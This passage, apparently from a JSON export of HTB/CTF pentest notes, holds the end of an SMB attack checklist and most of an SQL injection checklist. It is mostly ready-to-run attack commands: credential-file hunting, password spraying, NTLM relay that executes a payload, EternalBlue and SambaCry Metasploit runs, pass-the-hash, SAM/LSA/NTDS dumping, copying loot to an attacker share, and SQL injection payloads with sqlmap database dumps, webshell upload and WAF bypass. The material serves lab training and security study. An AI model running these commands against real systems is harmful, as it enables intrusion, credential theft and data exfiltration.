class=\"task-list-indicator\"></span></label> Configuration files / credentials</li>\n</ul>\n<pre><code class=\"language-bash\"># Search in the share\n*.conf, *.cfg, *.env, *.ini, *.php, *.xml, *.yml\nweb.config, .htaccess, .htpasswd, *.kdbx, *.config\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Backups and archives</li>\n</ul>\n<pre><code class=\"language-bash\">*.zip, *.tar*, *.bak, *.sql, *.dump, *.old, *.vhd, *.vmdk\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Sensitive Windows files</li>\n</ul>\n<pre><code class=\"language-bash\"># SAM/SYSTEM (backup)\nSAM, SYSTEM, SECURITY, ntds.dit\n# Group Policy Preferences (plaintext passwords)\nGroups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml\n# SSH Keys\nid_rsa, *.pem, *.ppk\n# KeePass database\n*.kdbx\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Recursive grep for passwords</li>\n</ul>\n<pre><code class=\"language-bash\">smbmap -H &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' -R &lt;SHARE&gt; --depth 10\n# Then search in downloaded files\ngrep -ri &quot;password\\|passwd\\|secret\\|credential\\|token&quot; &lt;downloaded_dir&gt;/\n</code></pre>\n<blockquote>\n<p><strong>SYSVOL and Group Policy Preferences</strong><br>\nOn domain controllers, SYSVOL may contain GPP files with encrypted passwords (AES-256, but the key is known and public).\n```bash</p>\n<h1 id=\"search-for-gpp-passwords\">Search for GPP passwords</h1>\n<p>nxc smb <TARGET> -u '<USER>' -p '<PASS>' -M gpp_password</p>\n<h1 id=\"or-manually\">or manually</h1>\n<p>gpp-decrypt \"<cpassword_value>\"\n```</p>\n</blockquote>\n<hr>\n<h2 id=\"4-user-enumeration-via-smbrpc\">4 // User Enumeration via SMB/RPC</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> RID Cycling (discover users without credentials)</li>\n</ul>\n<pre><code class=\"language-bash\">nxc smb &lt;TARGET&gt; -u 'guest' -p '' --rid-brute 5000\nnxc smb &lt;TARGET&gt; -u '' -p '' --rid-brute 5000\nimpacket-lookupsid guest@&lt;TARGET&gt; -no-pass 20000\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> User enumeration with rpcclient</li>\n</ul>\n<pre><code class=\"language-bash\">rpcclient -U '' -N &lt;TARGET&gt; -c 'enumdomusers'\nrpcclient -U '' -N &lt;TARGET&gt; -c 'querydispinfo'\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> User enumeration with nxc</li>\n</ul>\n<pre><code class=\"language-bash\">nxc smb &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' --users\nnxc smb &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' --groups\n</code></pre>\n<blockquote>\n<p>Deep dive: RPC</p>\n</blockquote>\n<hr>\n<h2 id=\"5-brute-force-password-spraying\">5 // Brute Force &amp; Password Spraying</h2>\n<blockquote>\n<p><strong>Warning</strong><br>\nPassword spraying = 1 password against many users. Much safer than brute force.\nRespect lockout policy (<code>rpcclient -c 'getdompwinfo'</code>).</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Password spray</li>\n</ul>\n<pre><code class=\"language-bash\"># One password at a time\nnxc smb &lt;TARGET&gt; -u users.txt -p 'Password1' --continue-on-success\n\n# Short list of common passwords\nnxc smb &lt;TARGET&gt; -u users.txt -p passwords.txt --no-bruteforce --continue-on-success\n\n# With jitter to avoid lockout\nnxc smb &lt;TARGET&gt; -u users.txt -p 'Season2026!' --continue-on-success --jitter 3\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Username = Password</li>\n</ul>\n<pre><code class=\"language-bash\">nxc smb &lt;TARGET&gt; -u users.txt -p users.txt --no-bruteforce --continue-on-success\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Hydra</li>\n</ul>\n<pre><code class=\"language-bash\">hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://&lt;TARGET&gt;\n</code></pre>\n<hr>\n<h2 id=\"6-smb-signing-ntlm-relay\">6 // SMB Signing &amp; NTLM Relay</h2>\n<blockquote>\n<p><strong>SMB Signing</strong><br>\nIf SMB signing is <strong>disabled</strong> (signing:False in nxc), SMB traffic is not authenticated.\nThis allows <strong>NTLM relay</strong>: intercept an authentication and relay it to another target.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check signing</li>\n</ul>\n<pre><code class=\"language-bash\">nxc smb &lt;TARGET&gt; --gen-relay-list relay_targets.txt\nnxc smb &lt;SUBNET&gt;/24 --gen-relay-list relay_targets.txt\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> NTLM Relay with impacket</li>\n</ul>\n<pre><code class=\"language-bash\"># Step 1: start Responder (disable SMB and HTTP)\nsudo responder -I tun0 -dwP\n\n# Step 2: relay to target without signing\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support\n\n# Useful options\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -i        # interactive shell\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -e rev.exe  # execute payload\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -c 'whoami' # command\n</code></pre>\n<hr>\n<h2 id=\"7-notable-cves\">7 // Notable CVEs</h2>\n<h3 id=\"eternalblue-ms17-010-cve-2017-0144\">EternalBlue // MS17-010 (CVE-2017-0144)</h3>\n<pre><code class=\"language-bash\"># Check\nnmap --script=smb-vuln-ms17-010 -p 445 &lt;TARGET&gt;\nnxc smb &lt;TARGET&gt; -u '' -p '' -M ms17-010\n\n# Exploit with Metasploit\nmsfconsole -q -x &quot;use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS &lt;TARGET&gt;; set LHOST &lt;ATTACKER&gt;; run&quot;\n\n# Standalone exploit (AutoBlue)\npython3 eternalblue_exploit7.py &lt;TARGET&gt; shellcode/sc_x64.bin\n</code></pre>\n<h3 id=\"sambacry-cve-2017-7494\">SambaCry // CVE-2017-7494</h3>\n<pre><code class=\"language-bash\"># Samba 3.5.0 - 4.6.4 // RCE via writable share\nnmap --script=smb-vuln-cve-2017-7494 -p 445 &lt;TARGET&gt;\n\n# Metasploit\nmsfconsole -q -x &quot;use exploit/linux/samba/is_known_pipename; set RHOSTS &lt;TARGET&gt;; run&quot;\n</code></pre>\n<h3 id=\"printnightmare-via-smb\">PrintNightmare via SMB</h3>\n<pre><code class=\"language-bash\"># If Print Spooler is active (see RPC)\nimpacket-rpcdump &lt;TARGET&gt; | grep -i print\n</code></pre>\n<h3 id=\"smbghost-cve-2020-0796\">SMBGhost // CVE-2020-0796</h3>\n<pre><code class=\"language-bash\"># SMBv3 compression // Windows 10 1903/1909\nnmap -p 445 --script=smb-protocols &lt;TARGET&gt;\n# Exploit: buffer overflow in SMBv3\n</code></pre>\n<hr>\n<h2 id=\"8-authentication-with-hash-pass-the-hash\">8 // Authentication with Hash (Pass-the-Hash)</h2>\n<blockquote>\n<p><strong>Pass-the-Hash</strong><br>\nSMB accepts NTLM authentication. If you have an NT hash of a user, you can authenticate without knowing the password.</p>\n</blockquote>\n<pre><code class=\"language-bash\"># nxc\nnxc smb &lt;TARGET&gt; -u '&lt;USER&gt;' -H '&lt;NT_HASH&gt;'\nnxc smb &lt;TARGET&gt; -u '&lt;USER&gt;' -H '&lt;NT_HASH&gt;' --shares\nnxc smb &lt;TARGET&gt; -u '&lt;USER&gt;' -H '&lt;NT_HASH&gt;' -x 'whoami'\n\n# smbclient\nsmbclient -U '&lt;USER&gt;%' //&lt;TARGET&gt;/&lt;SHARE&gt; --pw-nt-hash &lt;NT_HASH&gt;\n\n# impacket\nimpacket-psexec &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET&gt; -hashes :&lt;NT_HASH&gt;\nimpacket-wmiexec &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET&gt; -hashes :&lt;NT_HASH&gt;\nimpacket-smbexec &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET&gt; -hashes :&lt;NT_HASH&gt;\n\n# evil-winrm (if WinRM is open)\nevil-winrm -i &lt;TARGET&gt; -u '&lt;USER&gt;' -H '&lt;NT_HASH&gt;'\n</code></pre>\n<hr>\n<h2 id=\"9-lateral-movement-via-smb\">9 // Lateral Movement via SMB</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> PsExec (requires admin + writable share)</li>\n</ul>\n<pre><code class=\"language-bash\">impacket-psexec &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET&gt;\nimpacket-psexec &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET&gt; -hashes :&lt;NT_HASH&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> SmbExec (more stealth, no file upload)</li>\n</ul>\n<pre><code class=\"language-bash\">impacket-smbexec &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> WmiExec (via WMI, no service created)</li>\n</ul>\n<pre><code class=\"language-bash\">impacket-wmiexec &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> nxc command execution</li>\n</ul>\n<pre><code class=\"language-bash\">nxc smb &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' -x 'whoami'        # cmd\nnxc smb &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' -X 'whoami'        # PowerShell\nnxc smb &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' --sam               # dump SAM\nnxc smb &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' --lsa               # dump LSA\nnxc smb &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' --ntds              # dump NTDS (DC)\n</code></pre>\n<hr>\n<h2 id=\"10-file-transfer-via-smb\">10 // File Transfer via SMB</h2>\n<blockquote>\n<p>See also: FileTransfer</p>\n</blockquote>\n<h3 id=\"from-attacker-to-target\">From attacker to target</h3>\n<pre><code class=\"language-bash\"># Host SMB share on the attacker machine\nimpacket-smbserver share . -smb2support\nimpacket-smbserver share . -smb2support -username user -password pass\n\n# On the target Windows\ncopy \\\\&lt;ATTACKER&gt;\\share\\file.exe C:\\Temp\\\n# or\nnet use Z: \\\\&lt;ATTACKER&gt;\\share /user:user pass\ncopy Z:\\file.exe C:\\Temp\\\n</code></pre>\n<h3 id=\"from-target-to-attacker\">From target to attacker</h3>\n<pre><code class=\"language-bash\"># On the target Windows\ncopy C:\\Users\\admin\\Desktop\\secret.txt \\\\&lt;ATTACKER&gt;\\share\\\n# or\nxcopy C:\\important\\ \\\\&lt;ATTACKER&gt;\\share\\loot\\ /E /Y\n</code></pre>\n<hr>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Escape</td>\n<td>SMB <code>Public</code> share enumerated with <code>smbget --recursive</code> → <code>SQL Server Procedures.pdf</code> with plaintext MSSQL credentials</td>\n</tr>\n<tr>\n<td>Mailing</td>\n<td>NTLMv2 hash of the user captured over SMB after CVE-2024-21413 (Outlook moniker) phishing — relay path</td>\n</tr>\n</tbody>\n</table>"
    },
    {
      "title": "SQL Injection — Detection and Exploitation Checklist",
      "slug": "sql-injection-detection-and-exploitation-checklist",
      "date": "2026·02·25",
      "tags": [
        "htb",
        "sqli",
        "web",
        "enumeration",
        "methodology",
        "enum"
      ],
      "desc": "Quick Order 1. Identify all parameters (GET, POST, cookies, headers, JSON) 2. Manual test with ', \", \\, -- - on every parameter 3. Observe SQL errors → identify DBMS 4. Confirm with tautologies (OR 1=1) or time-based (SLEEP(5)) 5. Determine type (UNION / error / blind) and…",
      "body": "<h2 id=\"recommended-execution-priority\">Recommended Execution Priority</h2>\n<blockquote>\n<p><strong>Quick Order</strong><br>\n1. Identify all parameters (GET, POST, cookies, headers, JSON)\n2. Manual test with <code>'</code>, <code>\"</code>, <code>\\</code>, <code>-- -</code> on every parameter\n3. Observe SQL errors → identify DBMS\n4. Confirm with tautologies (<code>OR 1=1</code>) or time-based (<code>SLEEP(5)</code>)\n5. Determine type (UNION / error / blind) and number of columns\n6. If UNION → direct extraction: database → tables → columns → dump\n7. If blind → use sqlmap to automate\n8. Dump credentials → crack hashes → password reuse on SSH/other services\n9. If DBA → file read/write → webshell or OS shell\n10. Look for flags and sensitive files</p>\n</blockquote>\n<hr>\n<h1 id=\"sql-injection-detection-exploitation-checklist\">SQL Injection // Detection &amp; Exploitation Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nChecklist to identify, confirm, and exploit SQL Injection on HTB/CTF machines.\nCovers: manual detection, error-based, UNION-based, blind (boolean/time), sqlmap, full database dump.\nAvailable tools: sqlmap, burpsuite, ffuf, curl</p>\n</blockquote>\n<hr>\n<h2 id=\"0-identify-injection-points\">0 // Identify Injection Points</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> GET Parameters</li>\n</ul>\n<pre><code>http://&lt;TARGET&gt;/page?id=1\nhttp://&lt;TARGET&gt;/search?q=test\nhttp://&lt;TARGET&gt;/profile?user=admin\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> POST Parameters (login forms, search, filters)</li>\n</ul>\n<pre><code>username=admin&amp;password=test\nsearch=keyword&amp;category=1\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Cookies and headers</li>\n</ul>\n<pre><code>Cookie: session=abc; role=user\nX-Forwarded-For: 127.0.0.1\nReferer: http://&lt;TARGET&gt;/page\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Path / REST endpoint</li>\n</ul>\n<pre><code>http://&lt;TARGET&gt;/user/1\nhttp://&lt;TARGET&gt;/article/test\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> JSON body (API)</li>\n</ul>\n<pre><code class=\"language-json\">{&quot;id&quot;: 1, &quot;username&quot;: &quot;admin&quot;}\n</code></pre>\n<blockquote>\n<p><strong>Where to Look</strong><br>\nAny input that ends up in a SQL query is a potential injection point: forms, URLs, cookies, HTTP headers, API JSON/XML. Test <strong>all</strong> parameters, not just the obvious ones.</p>\n</blockquote>\n<hr>\n<h2 id=\"1-manual-sql-detection-tests\">1 // Manual SQL detection tests</h2>\n<h3 id=\"sql-syntax-errors\">SQL Syntax Errors</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Add characters that break the query</li>\n</ul>\n<pre><code>'        → single quote\n&quot;        → double quote\n`        → backtick (MySQL)\n)        → closing parenthesis\n;        → statement terminator\n\\        → escape character\n</code></pre>\n<p>Example:</p>\n<pre><code class=\"language-bash\">curl &quot;http://&lt;TARGET&gt;/page?id=1'&quot;\ncurl &quot;http://&lt;TARGET&gt;/page?id=1\\&quot;&quot;\n</code></pre>\n<blockquote>\n<p><strong>What to look for in the response</strong><br>\n- Explicit SQL errors: <code>You have an error in your SQL syntax</code>, <code>Unclosed quotation mark</code>, <code>pg_query()</code>, <code>sqlite3.OperationalError</code>\n- Behavior change: empty page, 500, different response\n- Generic error message where content used to be</p>\n</blockquote>\n<h3 id=\"tautologies-and-boolean-conditions\">Tautologies and boolean conditions</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Boolean tests to confirm injection</li>\n</ul>\n<pre><code># True condition (should return the same result)\n?id=1 OR 1=1\n?id=1' OR '1'='1\n?id=1&quot; OR &quot;1&quot;=&quot;1\n\n# False condition (different or empty result)\n?id=1 AND 1=2\n?id=1' AND '1'='2\n</code></pre>\n<h3 id=\"arithmetic-operations\">Arithmetic operations</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Confirm with calculations</li>\n</ul>\n<pre><code># If id=2 works, id=3-1 should also work\n?id=3-1\n?id=1+1\n\n# String concatenation (varies by DBMS)\n?name=adm'||'in        → Oracle, PostgreSQL, SQLite\n?name=adm'+'in         → MSSQL\n?name=adm' 'in         → MySQL (space = concat)\n</code></pre>\n<h3 id=\"time-based-blind\">Time-based (blind)</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Delay to confirm injection</li>\n</ul>\n<pre><code># MySQL\n?id=1' AND SLEEP(5)-- -\n?id=1' AND IF(1=1,SLEEP(5),0)-- -\n\n# PostgreSQL\n?id=1'; SELECT pg_sleep(5)-- -\n\n# MSSQL\n?id=1'; WAITFOR DELAY '0:0:5'-- -\n\n# SQLite\n?id=1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -\n</code></pre>\n<blockquote>\n<p><strong>Time-based</strong><br>\nIf the response arrives with ~5 seconds of delay → injection confirmed. Useful when there are no visible errors or differences in the response.</p>\n</blockquote>\n<hr>\n<h2 id=\"2-identifying-the-dbms\">2 // Identifying the DBMS</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> From error messages</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Message</th>\n<th>DBMS</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>You have an error in your SQL syntax</code></td>\n<td>MySQL</td>\n</tr>\n<tr>\n<td><code>ERROR: syntax error at or near</code></td>\n<td>PostgreSQL</td>\n</tr>\n<tr>\n<td><code>Unclosed quotation mark</code> / <code>Microsoft SQL</code></td>\n<td>MSSQL</td>\n</tr>\n<tr>\n<td><code>sqlite3.OperationalError</code></td>\n<td>SQLite</td>\n</tr>\n<tr>\n<td><code>ORA-00933</code> / <code>ORA-01756</code></td>\n<td>Oracle</td>\n</tr>\n</tbody>\n</table>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> With specific queries</li>\n</ul>\n<pre><code># MySQL\n?id=1' AND @@version-- -\n\n# PostgreSQL\n?id=1' AND version()-- -\n\n# MSSQL\n?id=1' AND @@version-- -\n\n# SQLite\n?id=1' AND sqlite_version()-- -\n\n# Oracle\n?id=1' AND banner FROM v$version-- -\n</code></pre>\n<hr>\n<h2 id=\"3-determine-the-injection-type\">3 // Determine the injection type</h2>\n<h3 id=\"31-union-based\">3.1 // UNION-based</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Find the number of columns</li>\n</ul>\n<pre><code># Incremental ORDER BY\n?id=1' ORDER BY 1-- -\n?id=1' ORDER BY 2-- -\n?id=1' ORDER BY 3-- -\n...  → error when exceeding the number of columns\n\n# UNION SELECT with NULL\n?id=1' UNION SELECT NULL-- -\n?id=1' UNION SELECT NULL,NULL-- -\n?id=1' UNION SELECT NULL,NULL,NULL-- -\n...  → success when the number of NULLs matches\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Identify the visible columns in output</li>\n</ul>\n<pre><code>?id=-1' UNION SELECT 1,2,3,4-- -\n</code></pre>\n<p>The numbers appearing on the page indicate the useful columns for extraction.</p>\n<h3 id=\"32-error-based\">3.2 // Error-based</h3>\n<pre><code># MySQL // extractvalue / updatexml\n?id=1' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -\n?id=1' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)-- -\n\n# PostgreSQL // CAST error\n?id=1' AND 1=CAST((SELECT version()) AS INT)-- -\n\n# MSSQL // CONVERT error\n?id=1' AND 1=CONVERT(INT,(SELECT @@version))-- -\n</code></pre>\n<h3 id=\"33-boolean-based-blind\">3.3 // Boolean-based blind</h3>\n<pre><code># Extract length\n?id=1' AND LENGTH(database())=5-- -\n?id=1' AND LENGTH(database())&gt;4-- -\n\n# Extract characters one by one\n?id=1' AND SUBSTRING(database(),1,1)='a'-- -\n?id=1' AND ASCII(SUBSTRING(database(),1,1))&gt;96-- -\n</code></pre>\n<h3 id=\"34-time-based-blind\">3.4 // Time-based blind</h3>\n<pre><code># MySQL\n?id=1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -\n\n# PostgreSQL\n?id=1' AND CASE WHEN SUBSTRING(current_database(),1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END-- -\n\n# MSSQL\n?id=1' AND IF SUBSTRING(DB_NAME(),1,1)='a' WAITFOR DELAY '0:0:5'-- -\n</code></pre>\n<hr>\n<h2 id=\"4-data-extraction-manual\">4 // Data Extraction (Manual)</h2>\n<h3 id=\"current-database-and-version\">Current Database and Version</h3>\n<pre><code class=\"language-sql\">-- MySQL\n' UNION SELECT version(),database(),user(),4-- -\n\n-- PostgreSQL\n' UNION SELECT version(),current_database(),current_user,4-- -\n\n-- MSSQL\n' UNION SELECT @@version,DB_NAME(),SYSTEM_USER,4-- -\n\n-- SQLite\n' UNION SELECT sqlite_version(),1,2,3-- -\n</code></pre>\n<h3 id=\"list-databases\">List Databases</h3>\n<pre><code class=\"language-sql\">-- MySQL\n' UNION SELECT schema_name,2,3,4 FROM information_schema.schemata-- -\n\n-- PostgreSQL\n' UNION SELECT datname,2,3,4 FROM pg_database-- -\n\n-- MSSQL\n' UNION SELECT name,2,3,4 FROM sys.databases-- -\n\n-- SQLite (single database, list tables directly)\n</code></pre>\n<h3 id=\"list-tables\">List Tables</h3>\n<pre><code class=\"language-sql\">-- MySQL / PostgreSQL\n' UNION SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema='&lt;DB&gt;'-- -\n\n-- MSSQL\n' UNION SELECT table_name,2,3,4 FROM information_schema.tables-- -\n\n-- SQLite\n' UNION SELECT name,2,3,4 FROM sqlite_master WHERE type='table'-- -\n</code></pre>\n<h3 id=\"list-columns\">List Columns</h3>\n<pre><code class=\"language-sql\">-- MySQL / PostgreSQL\n' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='&lt;TABLE&gt;'-- -\n\n-- MSSQL\n' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='&lt;TABLE&gt;'-- -\n\n-- SQLite\n' UNION SELECT sql,2,3,4 FROM sqlite_master WHERE name='&lt;TABLE&gt;'-- -\n</code></pre>\n<h3 id=\"dump-data\">Dump Data</h3>\n<pre><code class=\"language-sql\">-- Dump users (generic example)\n' UNION SELECT username,password,3,4 FROM users-- -\n\n-- Concatenate multiple columns into one\n' UNION SELECT CONCAT(username,':',password),2,3,4 FROM users-- -          -- MySQL\n' UNION SELECT username||':'||password,2,3,4 FROM users-- -                 -- PostgreSQL/SQLite\n' UNION SELECT username+':'+password,2,3,4 FROM users-- -                   -- MSSQL\n</code></pre>\n<hr>\n<h2 id=\"5-sqlmap\">5 // sqlmap</h2>\n<h3 id=\"basic-usage\">Basic Usage</h3>\n<pre><code class=\"language-bash\"># GET parameter\nsqlmap -u &quot;http://&lt;TARGET&gt;/page?id=1&quot; --batch --dbs\n\n# POST (request saved from Burp)\nsqlmap -r request.txt --batch --dbs\n\n# POST with inline data\nsqlmap -u &quot;http://&lt;TARGET&gt;/login&quot; --data &quot;username=admin&amp;password=test&quot; --batch --dbs\n\n# Cookie injection\nsqlmap -u &quot;http://&lt;TARGET&gt;/page&quot; --cookie &quot;session=abc&quot; --level 2 --batch --dbs\n\n# Header injection\nsqlmap -u &quot;http://&lt;TARGET&gt;/page&quot; --headers &quot;X-Forwarded-For: 1*&quot; --level 3 --batch --dbs\n</code></pre>\n<h3 id=\"progressive-enumeration\">Progressive Enumeration</h3>\n<pre><code class=\"language-bash\"># 1. Databases\nsqlmap -u &quot;http://&lt;TARGET&gt;/page?id=1&quot; --batch --dbs\n\n# 2. Tables of a database\nsqlmap -u &quot;http://&lt;TARGET&gt;/page?id=1&quot; --batch -D &lt;DATABASE&gt; --tables\n\n# 3. Columns of a table\nsqlmap -u &quot;http://&lt;TARGET&gt;/page?id=1&quot; --batch -D &lt;DATABASE&gt; -T &lt;TABLE&gt; --columns\n\n# 4. Data dump\nsqlmap -u &quot;http://&lt;TARGET&gt;/page?id=1&quot; --batch -D &lt;DATABASE&gt; -T &lt;TABLE&gt; -C username,password --dump\n\n# 5. Full database dump\nsqlmap -u &quot;http://&lt;TARGET&gt;/page?id=1&quot; --batch -D &lt;DATABASE&gt; --dump\n</code></pre>\n<h3 id=\"useful-flags\">Useful Flags</h3>\n<table>\n<thead>\n<tr>\n<th>Flag</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>--batch</code></td>\n<td>Do not ask for confirmations</td>\n</tr>\n<tr>\n<td><code>--level 3</code></td>\n<td>Deep testing (headers, cookies)</td>\n</tr>\n<tr>\n<td><code>--risk 3</code></td>\n<td>More aggressive payloads (OR-based, UPDATE)</td>\n</tr>\n<tr>\n<td><code>--technique=BEUSTQ</code></td>\n<td>Specify techniques (Boolean, Error, Union, Stacked, Time, Query)</td>\n</tr>\n<tr>\n<td><code>--dbms=mysql</code></td>\n<td>Force DBMS</td>\n</tr>\n<tr>\n<td><code>--threads 10</code></td>\n<td>Parallelism</td>\n</tr>\n<tr>\n<td><code>--tamper=&lt;script&gt;</code></td>\n<td>Bypass WAF (space2comment, charencode, randomcase)</td>\n</tr>\n<tr>\n<td><code>--os-shell</code></td>\n<td>OS shell via SQL</td>\n</tr>\n<tr>\n<td><code>--sql-shell</code></td>\n<td>Interactive SQL shell</td>\n</tr>\n<tr>\n<td><code>--file-read=/etc/passwd</code></td>\n<td>File reading</td>\n</tr>\n<tr>\n<td><code>--file-write=shell.php --file-dest=/var/www/html/shell.php</code></td>\n<td>File upload</td>\n</tr>\n<tr>\n<td><code>--passwords</code></td>\n<td>Dump DBMS user hashes</td>\n</tr>\n<tr>\n<td><code>--current-user</code></td>\n<td>Current user</td>\n</tr>\n<tr>\n<td><code>--current-db</code></td>\n<td>Current database</td>\n</tr>\n<tr>\n<td><code>--is-dba</code></td>\n<td>Check if DBA</td>\n</tr>\n<tr>\n<td><code>--privileges</code></td>\n<td>User privileges</td>\n</tr>\n<tr>\n<td><code>-p id</code></td>\n<td>Specify parameter to test</td>\n</tr>\n<tr>\n<td><code>--prefix=\"')\"</code></td>\n<td>Custom prefix to close query</td>\n</tr>\n<tr>\n<td><code>--suffix=\"-- -\"</code></td>\n<td>Custom suffix</td>\n</tr>\n<tr>\n<td><code>--proxy=http://127.0.0.1:8080</code></td>\n<td>Proxy (Burp)</td>\n</tr>\n<tr>\n<td><code>--random-agent</code></td>\n<td>Random User-Agent</td>\n</tr>\n<tr>\n<td><code>--flush-session</code></td>\n<td>Clears previous session cache</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"common-tamper-scripts-bypass-waffilters\">Common Tamper Scripts (Bypass WAF/Filters)</h3>\n<pre><code class=\"language-bash\"># Blocked spaces\nsqlmap ... --tamper=space2comment          # /**/ instead of spaces\nsqlmap ... --tamper=space2plus             # + instead of spaces\n\n# Blocked keywords\nsqlmap ... --tamper=randomcase             # SeLeCt\nsqlmap ... --tamper=between                # NOT BETWEEN 0 AND instead of &gt;\n\n# Encoding\nsqlmap ... --tamper=charencode             # 